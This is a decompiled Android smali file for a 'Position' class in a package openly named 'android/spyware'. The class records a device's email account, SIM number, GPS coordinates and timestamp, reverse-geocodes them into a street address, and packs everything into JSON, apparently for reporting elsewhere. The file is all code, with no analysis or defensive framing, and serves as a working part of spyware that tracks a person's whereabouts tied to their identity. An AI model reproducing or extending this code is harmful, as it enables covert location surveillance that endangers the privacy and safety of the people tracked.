.class public Landroid/spyware/Position;
.super Ljava/lang/Object;
.source "Position.java"


# instance fields
.field private accuracy:F

.field private address:Ljava/lang/String;

.field private altitude:D

.field private date:Ljava/util/Date;

.field private email:Ljava/lang/String;

.field private latitude:D

.field private longitude:D

.field private provider:Ljava/lang/String;

.field private simNo:Ljava/lang/String;


# direct methods
.method public constructor <init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;DDDFLjava/lang/String;Ljava/util/Date;)V
    .registers 15
    .param p1, "email"    # Ljava/lang/String;
    .param p2, "simNo"    # Ljava/lang/String;
    .param p3, "address"    # Ljava/lang/String;
    .param p4, "longitude"    # D
    .param p6, "latitude"    # D
    .param p8, "altitude"    # D
    .param p10, "accuracy"    # F
    .param p11, "provider"    # Ljava/lang/String;
    .param p12, "date"    # Ljava/util/Date;

    .prologue
    .line 35
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 36
    iput-object p1, p0, Landroid/spyware/Position;->email:Ljava/lang/String;

    .line 37
    iput-object p2, p0, Landroid/spyware/Position;->simNo:Ljava/lang/String;

    .line 38
    iput-object p3, p0, Landroid/spyware/Position;->address:Ljava/lang/String;

    .line 39
    iput-wide p4, p0, Landroid/spyware/Position;->longitude:D

    .line 40
    iput-wide p6, p0, Landroid/spyware/Position;->latitude:D

    .line 41
    iput-wide p8, p0, Landroid/spyware/Position;->altitude:D

    .line 42
    iput p10, p0, Landroid/spyware/Position;->accuracy:F

    .line 43
    invoke-virtual {p11}, Ljava/lang/String;->toUpperCase()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Landroid/spyware/Position;->provider:Ljava/lang/String;

    .line 44
    iput-object p12, p0, Landroid/spyware/Position;->date:Ljava/util/Date;

    .line 45
    return-void
.end method

.method public static getAddress(Landroid/content/Context;DD)Ljava/lang/String;
    .registers 16
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "latitude"    # D
    .param p3, "longitude"    # D

    .prologue
    .line 48
    new-instance v1, Landroid/location/Geocoder;

    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v2

    invoke-direct {v1, p0, v2}, Landroid/location/Geocoder;-><init>(Landroid/content/Context;Ljava/util/Locale;)V

    .line 49
    .local v1, "geocoder":Landroid/location/Geocoder;
    const/4 v9, 0x0

    .line 52
    .local v9, "result":Ljava/lang/String;
    const/4 v6, 0x1

    move-wide v2, p1

    move-wide v4, p3

    :try_start_d
    invoke-virtual/range {v1 .. v6}, Landroid/location/Geocoder;->getFromLocation(DDI)Ljava/util/List;

    move-result-object v7

    .line 54
    .local v7, "addresses":Ljava/util/List;, "Ljava/util/List<Landroid/location/Address;>;"
    if-eqz v7, :cond_83

    invoke-interface {v7}, Ljava/util/List;->size()I

    move-result v2

    if-lez v2, :cond_83

    .line 55
    const/4 v2, 0x0

    invoke-interface {v7, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/location/Address;

    .line 56
    .local v0, "address":Landroid/location/Address;
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v3, 0x0

    invoke-virtual {v0, v3}, Landroid/location/Address;->getAddressLine(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "\n"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    .line 57
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v0}, Landroid/location/Address;->getPostalCode()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "\n"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    .line 58
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v0}, Landroid/location/Address;->getLocality()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "\n"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    .line 59
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v0}, Landroid/location/Address;->getCountryName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    :try_end_82
    .catch Ljava/io/IOException; {:try_start_d .. :try_end_82} :catch_84

    move-result-object v9

    .line 66
    .end local v0    # "address":Landroid/location/Address;
    .end local v7    # "addresses":Ljava/util/List;, "Ljava/util/List<Landroid/location/Address;>;"
    :cond_83
    :goto_83
    return-object v9

    .line 61
    :catch_84
    move-exception v8

    .line 63
    .local v8, "e":Ljava/io/IOException;
    const-string v2, "::trace"

    const-string v3, "::ERR  Impossible to connect to geocoder."

    invoke-static {v2, v3}, Landroid/util/Log;->wtf(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_83
.end method


# virtual methods
.method public toJSON()Lorg/json/JSONObject;
    .registers 7

    .prologue
    .line 70
    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    .line 73
    .local v2, "jLocation":Lorg/json/JSONObject;
    :try_start_5
    const-string v3, "email"

    iget-object v4, p0, Landroid/spyware/Position;->email:Ljava/lang/String;

    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 74
    const-string v3, "simNo"

    iget-object v4, p0, Landroid/spyware/Position;->simNo:Ljava/lang/String;

    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 75
    const-string v3, "address"

    iget-object v4, p0, Landroid/spyware/Position;->address:Ljava/lang/String;

    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 76
    const-string v3, "longitude"

    iget-wide v4, p0, Landroid/spyware/Position;->longitude:D

    invoke-virtual {v2, v3, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    .line 77
    const-string v3, "latitude"

    iget-wide v4, p0, Landroid/spyware/Position;->latitude:D

    invoke-virtual {v2, v3, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    .line 78
    const-string v3, "altitude"

    iget-wide v4, p0, Landroid/spyware/Position;->altitude:D

    invoke-virtual {v2, v3, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    .line 79
    const-string v3, "accuracy"

    iget v4, p0, Landroid/spyware/Position;->accuracy:F

    float-to-double v4, v4

    invoke-virtual {v2, v3, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    .line 80
    const-string v3, "provider"

    iget-object v4, p0, Landroid/spyware/Position;->provider:Ljava/lang/String;

    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 83
    new-instance v1, Ljava/text/SimpleDateFormat;

    const-string v3, "yyyy-MM-dd HH:mm:ss"

    sget-object v4, Ljava/util/Locale;->US:Ljava/util/Locale;

    invoke-direct {v1, v3, v4}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;Ljava/util/Locale;)V

    .line 84
    .local v1, "format":Ljava/text/SimpleDateFormat;
    const-string v3, "date"

    iget-object v4, p0, Landroid/spyware/Position;->date:Ljava/util/Date;

    invoke-virtual {v1, v4}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_52
    .catch Lorg/json/JSONException; {:try_start_5 .. :try_end_52} :catch_53

    .line 91
    .end local v1    # "format":Ljava/text/SimpleDateFormat;
    .end local v2    # "jLocation":Lorg/json/JSONObject;
    :goto_52
    return-object v2

    .line 85
    .restart local v2    # "jLocation":Lorg/json/JSONObject;
    :catch_53
    move-exception v0

    .line 87
    .local v0, "e":Lorg/json/JSONException;
    const-string v3, "::trace"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "::ERR  "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-static {v0}, Landroid/util/Log;->getStackTraceString(Ljava/lang/Throwable;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->wtf(Ljava/lang/String;Ljava/lang/String;)I

    .line 88
    const/4 v2, 0x0

    goto :goto_52
.end method
